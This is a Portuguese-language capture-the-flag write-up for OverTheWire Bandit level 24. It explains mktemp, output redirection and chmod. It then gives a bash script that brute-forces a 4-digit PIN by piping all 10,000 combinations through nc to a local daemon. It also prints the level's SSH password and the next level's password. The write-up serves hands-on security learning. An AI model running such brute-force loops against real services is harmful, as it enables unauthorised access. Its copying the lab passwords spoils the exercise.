# Level 24
**Tópicos**

- [X] [Goal](#goal)
- [X] [Um pouco de Teoria](#teoria)
- [X] [Write Up](#write-up)
- [X] [Solução](#soluçao)
- [X] [Resources](#resources)

## Goal
Um daemon está escutando na porta 30002 e fornecerá a senha para bandit25 se for fornecida a senha para bandit24 e um código numérico secreto de 4 dígitos. Não há como recuperar o código PIN, exceto passando por todas as 10.000 combinações, chamadas de força bruta.
Você não precisa criar novas conexões toda vez.

## Teoria
**Bash Script**

Para entender mais a estrutura do [bash script](https://learnxinyminutes.com/docs/bash/)

**mktemp**

Cria ou um arquivo ou um diretório temporário. E printa o nome deste na saída padrão. Se não form passada nenhuma flag ele cria um arquivo, se passarmos `-d`, é criado um diretório.

**Diferença entre > e >>**

O `>` sobrescreve um arquivo já existente ou um novo arquivo é criado desde que o nome do arquivo mencionado não esteja no diretório. 

E o `>>` acrescenta a informação em um arquivo já existente ou cria um novo arquivo se esse nome de arquivo não existir no diretório.

**chmod +x**

Dá a permissão para todos os usuários executarem o arquivo. [Para saber mais.](https://www.gnu.org/software/coreutils/manual/html_node/Setting-Permissions.html)

## Write up
**Informações**
- Host Name: `bandit.labs.overthewire.org`
- Username: `bandit24`
- Password: `VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`
- Port Number: `2220`

**Passo a Passo**

***[# Passo1.]*** Conectar e logar no SSH usando as informações acima.

***[# Passo2.]*** Criar um diretório temporário e entrar nele.

***[# Passo3.]*** Escrever um script que coloque todos os possivéis casos em um arquivo, a senha do bandit24 e 4 digitos separado por um espaço. E depois pegue esse arquivo com as possibilidades e conecte com localhost na porta 30002 e coloque as saídas em um outro arquivo. Além disso, que ordena o arquivo de resultados e, por fim pegue a saída que tem a palavra `password`.

***[# Passo4.]*** Depois de ter escrito o script, mude as permissões dele, para que este seja executável. Por fim, execute o script.

***[# Passo*.]*** Para sair, rode `exit`

## Solução
<prep>
[# Passo1.] 

<b>> ssh bandit24@bandit.labs.overthewire.org -p 2220</b>

bandit24@bandit.labs.overthewire.org's password: <b>VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar</b>

[# Passo2.]

<b>bandit24@bandit:~$</b> mktemp -d

/tmp/tmp.zkGGsU2zpX

[# Passo3.]

<b>bandit24@bandit:/tmp/tmp.zkGGsU2zpX$</b> nano script.sh

<i>Editando o script.sh</i>

#!/bin/bash

for i in {0000..9999}

do

    echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i >> allCases.txt

done

cat allCases.txt | nc localhost 30002 >> results.txt

sort results.txt > results2.txt

grep password results2.txt

[# Passo4.]

<b>bandit24@bandit:/tmp/tmp.zkGGsU2zpX$</b> chmod +x script.sh

<b>bandit24@bandit:/tmp/tmp.zkGGsU2zpX$</b> ./script.sh


[# Passo*.] 
<b>bandit24@bandit:~$</b> exit

logout                

Connection to bandit.labs.overthewire.org closed.
</prep>

**Credenciais para o Level 25:**
- Username: `bandit25`
- Password: `p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d`

## Resources
[OverTheWire](https://overthewire.org/wargames/bandit/bandit25.html)


